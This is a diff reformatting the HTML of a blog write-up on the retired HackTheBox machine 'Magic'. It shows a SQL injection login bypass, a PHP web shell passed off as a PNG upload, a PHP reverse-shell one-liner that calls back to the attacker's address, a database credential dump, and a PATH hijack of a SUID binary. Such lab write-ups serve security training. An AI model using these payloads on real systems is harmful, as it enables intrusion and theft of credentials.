@@ -1,168 +1,122 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Magic publish by TRX on April 18 2020. This box is classified as a medium machine but is quit easy. It involves a basic SQL injection, a magic file upload and a SUID binary." />
-<meta name="keywords" content="security, boot2root, HTB, linux, Upload, SUID, SQLi">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Magic"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Magic publish by TRX on April 18 2020. This box is classified as a medium machine but is quit easy. It involves a basic SQL injection, a magic file upload and a SUID binary."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2020/08/htb-magic.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2020-08-29 08:50:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="linux"/>
-  <meta property="article:tag" content="Upload"/>
-  <meta property="article:tag" content="SUID"/>
-  <meta property="article:tag" content="SQLi"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Magic</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Magic publish by TRX on April 18 2020. This box is classified as a medium machine but is quit easy. It involves a basic SQL injection, a magic file upload and a SUID binary." name="description"/>
+<meta content="security, boot2root, HTB, linux, Upload, SUID, SQLi" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Magic" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Magic publish by TRX on April 18 2020. This box is classified as a medium machine but is quit easy. It involves a basic SQL injection, a magic file upload and a SUID binary." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2020/08/htb-magic.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-08-29 08:50:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="linux" property="article:tag"/>
+<meta content="Upload" property="article:tag"/>
+<meta content="SUID" property="article:tag"/>
+<meta content="SQLi" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Magic</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-magic">HTB: Magic</h1>
-    <p>
+<header>
+<h1 id="htb-magic">HTB: Magic</h1>
+<p>
       Posted on 29 Aug 2020 in <a href="../../category/security.html">security</a>
 
-        &#8226; 6 min read
+        • 6 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2020.08/magic_card.png" alt="Magic card" width="262"></p>
+</header>
+<div>
+<p><img alt="Magic card" class="align-left" src="/media/2020.08/magic_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/241">Magic</a> publish by
 <a href="https://www.hackthebox.com/home/users/profile/31190">TRX</a> on April 18 2020.
 This box is classified as a medium machine but is quit easy.
 It involves a basic SQL injection, a magic file upload and a SUID binary.</p>
-
-
 <h1>Recon</h1>
 <p>We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP).</p>
 <div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Mon Apr 20 11:14:29 2020 as: nmap -p- -oN nmap 10.10.10.185
@@ -175,19 +129,17 @@ PORT   STATE SERVICE
 
 # Nmap done at Mon Apr 20 11:14:42 2020 -- 1 IP address (1 host up) scanned in 12.63 seconds
 </code></pre></div>
-
 <h1>SSH</h1>
 <p>The SSH service accept only public key authentication. Therefore we won't be
 able to use any password found to connect to the SSH service.</p>
 <div class="highlight"><pre><span></span><code>kali@kali:~$ ssh toto@10.10.10.185
 toto@10.10.10.185: Permission denied (publickey).
 </code></pre></div>
-
 <h1>Web</h1>
 <p>The website expose some picture gallery.</p>
-<p><img alt="main page" src="/media/2020.08/magic_01.png"></p>
+<p><img alt="main page" class="image-process-article-image" src="/media/2020.08/derivatives/article-image/magic_01.png"/></p>
 <p>The website announce that we need to login to upload new picture.</p>
-<p><img alt="login form" src="/media/2020.08/magic_02.png"></p>
+<p><img alt="login form" class="image-process-article-image" src="/media/2020.08/derivatives/article-image/magic_02.png"/></p>
 <p>Some mechanism forbid us to put space in our username and password. We fire up
 Burp and edit the request using the <code>Intercept</code> function so that our post
 request look like the following</p>
@@ -196,11 +148,10 @@ Host: 10.10.10.185
 Connection: close
 Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs
 
-username=aa&#39; or 1=1 -- &amp;password=a
+username=aa' or 1=1 -- &amp;password=a
 </code></pre></div>
-
 <p>We are then logged in and we can upload picture using the application.</p>
-<p><img alt="upload form" src="/media/2020.08/magic_03.png"></p>
+<p><img alt="upload form" class="image-process-article-image" src="/media/2020.08/derivatives/article-image/magic_03.png"/></p>
 <p>Obviously we want to upload some PHP file for instance
 <code>/usr/share/webshells/php/simple-backdoor.php</code>. We intercept the request with
 Burp and change the Content-Type to <code>image/png</code> and the image name to
@@ -211,10 +162,10 @@ Burp and change the Content-Type to <code>image/png</code> and the image name to
 PNG <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">magic number</a> to
 our file.</p>
 <p>Still using Burp we add <code>aaaaaaaa</code> at the begging of our file.</p>
-<p><img alt="Burp request with aaaaaaaa" src="/media/2020.08/magic_04.png"></p>
+<p><img alt="Burp request with aaaaaaaa" class="image-process-article-image" src="/media/2020.08/derivatives/article-image/magic_04.png"/></p>
 <p>Using the Raw editor in Burp we replace our <code>a</code> (<code>61</code>) by the PNG's magic number
 <code>89 50 4E 47 0D 0A 1A 0A</code>.</p>
-<p><img alt="Burp request with PNG's magic number" src="/media/2020.08/magic_05.png"></p>
+<p><img alt="Burp request with PNG's magic number" class="image-process-article-image" src="/media/2020.08/derivatives/article-image/magic_05.png"/></p>
 <p>Our request now looks like the following (I was forced to clean the requests
 with the magic numbers as it broke the RSS/Atom xml).</p>
 <div class="highlight"><pre><span></span><code>POST /upload.php HTTP/1.1
@@ -225,7 +176,7 @@ Connection: close
 Cookie: PHPSESSID=gl7e03c4vb6ejee40tgeobjhfh
 
 -----------------------------1971341748341881315972996739
-Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;simple-backdoor2.php.png&quot;
+Content-Disposition: form-data; name="image"; filename="simple-backdoor2.php.png"
 Content-Type: image/png
 
 &lt;89&gt;PNG
@@ -235,11 +186,11 @@ Content-Type: image/png
 
 &lt;?php
 
-if(isset($_REQUEST[&#39;cmd&#39;])){
-        echo &quot;&lt;pre&gt;&quot;;
-        $cmd = ($_REQUEST[&#39;cmd&#39;]);
+if(isset($_REQUEST['cmd'])){
+        echo "&lt;pre&gt;";
+        $cmd = ($_REQUEST['cmd']);
         system($cmd);
-        echo &quot;&lt;/pre&gt;&quot;;
+        echo "&lt;/pre&gt;";
         die;
 }
 
@@ -250,12 +201,11 @@ Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 &lt;!--    http://michaeldaw.org   2006    --&gt;
 
 -----------------------------1971341748341881315972996739
-Content-Disposition: form-data; name=&quot;submit&quot;
+Content-Disposition: form-data; name="submit"
 
 Upload Image
 -----------------------------1971341748341881315972996739--
 </code></pre></div>
-
 <p>This "image" will be uploaded and we can then go to
 <code>http://10.10.10.185/images/uploads/simple-backdoor2.php</code> to execute some
 commands on the system.</p>
@@ -284,15 +234,15 @@ Content-Type: text/html; charset=UTF-8
 &lt;pre&gt;
 class Database
 {
-    private static $dbName = &#39;Magic&#39; ;
-    private static $dbHost = &#39;localhost&#39; ;
-    private static $dbUsername = &#39;theseus&#39;;
-    private static $dbUserPassword = &#39;iamkingtheseus&#39;;
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = 'theseus';
+    private static $dbUserPassword = 'iamkingtheseus';
 
     private static $cont  = null;
 
     public function __construct() {
-        die(&#39;Init function is not allowed&#39;);
+        die('Init function is not allowed');
     }
 
     public static function connect()
@@ -302,7 +252,7 @@ class Database
         {
             try
             {
-                self::$cont =  new PDO( &quot;mysql:host=&quot;.self::$dbHost.&quot;;&quot;.&quot;dbname=&quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword);
+                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
             }
             catch(PDOException $e)
             {
@@ -319,7 +269,6 @@ class Database
 }
 &lt;/pre&gt;
 </code></pre></div>
-
 <p>We can then use <code>mysqldump</code> (which is strangely present on the box) to dump the
 content of all databases using the previous credentials. That give us the
 credentials for the web login form: <code>admin:Th3s3usW4sK1ng</code>.</p>
@@ -353,10 +302,10 @@ Content-Type: text/html; charset=UTF-8
 /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
 /*!40101 SET NAMES utf8 */;
 /*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
-/*!40103 SET TIME_ZONE=&#39;+00:00&#39; */;
+/*!40103 SET TIME_ZONE='+00:00' */;
 /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
 /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
-/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#39;NO_AUTO_VALUE_ON_ZERO&#39; */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
 /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
 
 --
@@ -389,7 +338,7 @@ CREATE TABLE `login` (
 
 LOCK TABLES `login` WRITE;
 /*!40000 ALTER TABLE `login` DISABLE KEYS */;
-INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;);
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
 /*!40000 ALTER TABLE `login` ENABLE KEYS */;
 UNLOCK TABLES;
 /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
@@ -405,23 +354,21 @@ UNLOCK TABLES;
 -- Dump completed on 2020-04-22  5:31:35
 &lt;/pre&gt;
 </code></pre></div>
-
 <p>It is time to get a proper shell. We know that PHP is installed on the box (as
 the web application is using PHP). So we use a PHP reverse shell and run
 <code>nc -l -p 4242</code> on our side.</p>
-<div class="highlight"><pre><span></span><code>GET /images/uploads/simple-backdoor2.php.png?cmd=php+-r+&#39;$sock%3dfsockopen(&quot;10.10.14.226&quot;,4242)%3bexec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#39; HTTP/1.1
+<div class="highlight"><pre><span></span><code>GET /images/uploads/simple-backdoor2.php.png?cmd=php+-r+'$sock%3dfsockopen("10.10.14.226",4242)%3bexec("/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263")%3b' HTTP/1.1
 Host: 10.10.10.185
 Connection: close
 Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs
 </code></pre></div>
-
 <p>That will give us a reverse shell as <code>www-data</code> without interactivity.
 Using <code>/usr/bin/script -qc /bin/bash /dev/null</code> we get a better shell with
 interactivity and can simply change user with <code>su theseus</code> and inputing his
 password <code>Th3s3usW4sK1ng</code></p>
 <p>Then we can grab the user flag.</p>
 <div class="highlight"><pre><span></span><code>nc -l -p 4242
-/bin/sh: 0: can&#39;t access tty; job control turned off
+/bin/sh: 0: can't access tty; job control turned off
 $ /usr/bin/script -qc /bin/bash /dev/null
 www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus
 su theseus
@@ -431,7 +378,6 @@ theseus@ubuntu:/var/www/Magic/images/uploads$ cat ~/user.txt
 cat ~/user.txt
 e0d993fb203a25ba31cee6d8aa2a612f
 </code></pre></div>
-
 <h1>Root</h1>
 <p>When looking at the SUID files we see that <code>sysinfo</code> is quit recent.</p>
 <div class="highlight"><pre><span></span><code>theseus@ubuntu:/var/www/Magic/images/uploads$ find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \; | grep -v snap
@@ -459,7 +405,6 @@ e0d993fb203a25ba31cee6d8aa2a612f
 -rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
 -rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
 </code></pre></div>
-
 <p>We use <code>ltrace</code> (also already on the box) to see the binary calls and quickly
 saw a call to <code>lshw</code> using a relative path.</p>
 <div class="highlight"><pre><span></span><code>theseus@ubuntu:/var/www/Magic/images/uploads$ ltrace /bin/sysinfo
@@ -472,14 +417,13 @@ _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x55b09400e020, 0x55b093
 _ZNSolsEPFRSoS_E(0x55b09400e020, 0x7f40c558f870, 0x55b09400e020, 0x55b093e0c92d====================Hardware Info====================
 ) = 0x55b09400e020
 _ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev(0x7ffef3bfc650, 0x55b093e0c92e, 0, 2880) = 0x7ffef3bfc660
-popen(&quot;lshw -short&quot;, &quot;r&quot;)                        = 0x55b095436280
+popen("lshw -short", "r")                        = 0x55b095436280
 fgets(WARNING: you should run this program as super-user.
-&quot;H/W path     Device  Class      &quot;..., 128, 0x563a9c8f6280)                                                                                = 0x7ffe1eb20b70
+"H/W path     Device  Class      "..., 128, 0x563a9c8f6280)                                                                                = 0x7ffe1eb20b70
 _ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffe1eb20c20, 0x7ffe1eb20b70, 0x7ffe1eb20b70, 0x6974706972637365)                  = 0x7ffe1eb20c20
-fgets(&quot;================================&quot;..., 128, 0x563a9c8f6280)                                                                                = 0x7ffe1eb20b70
+fgets("================================"..., 128, 0x563a9c8f6280)                                                                                = 0x7ffe1eb20b70
 _ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffe1eb20c20, 0x7ffe1eb20b70, 0x7ffe1eb20b70, 0x3d3d3d3d3d3d3d3d)                  = 0x7ffe1eb20c20
 </code></pre></div>
-
 <p>So we simply exploit this <code>PATH</code> vulnerability and get the root flag.</p>
 <div class="highlight"><pre><span></span><code>theseus@ubuntu:/var/www/Magic/images/uploads$ cd /tmp/
 cd /tmp/
@@ -487,8 +431,8 @@ theseus@ubuntu:/tmp$ mkdir ioio
 mkdir ioio
 theseus@ubuntu:/tmp$ cd ioio
 cd ioio
-theseus@ubuntu:/tmp/ioio$ echo &#39;cat /root/root.txt&#39; &gt; lshw
-echo &#39;cat /root/root.txt&#39; &gt; lshw
+theseus@ubuntu:/tmp/ioio$ echo 'cat /root/root.txt' &gt; lshw
+echo 'cat /root/root.txt' &gt; lshw
 theseus@ubuntu:/tmp/ioio$ PATH=./:$PATH
 PATH=./:$PATH
 theseus@ubuntu:/tmp/ioio$ chmod +x lshw
@@ -510,69 +454,47 @@ Units: sectors of 1 * 512 = 512 bytes
 Sector size (logical/physical): 512 bytes / 512 bytes
 I/O size (minimum/optimal): 512 bytes / 512 bytes
 </code></pre></div>
-
 <p>(The flag is in the <code>Hardware Info</code> part in the first lines of the <code>sysinfo</code> output.)</p>
 <h1>Wrapping up</h1>
 <p>Quit an easy but pleasant box. I will recommend this box to beginners as I
 really enjoyed it.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/linux.html">linux</a>
-      <a href="../../tag/upload.html">Upload</a>
-      <a href="../../tag/suid.html">SUID</a>
-      <a href="../../tag/sqli.html">SQLi</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2020/08/htb-traceback.html" title="HTB: Traceback">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2020/09/htb-admirer.html" title="HTB: Admirer">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/linux.html">linux</a>
+<a href="../../tag/upload.html">Upload</a>
+<a href="../../tag/suid.html">SUID</a>
+<a href="../../tag/sqli.html">SQLi</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2020/08/htb-traceback.html" title="HTB: Traceback">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2020/09/htb-admirer.html" title="HTB: Admirer">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -583,6 +505,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
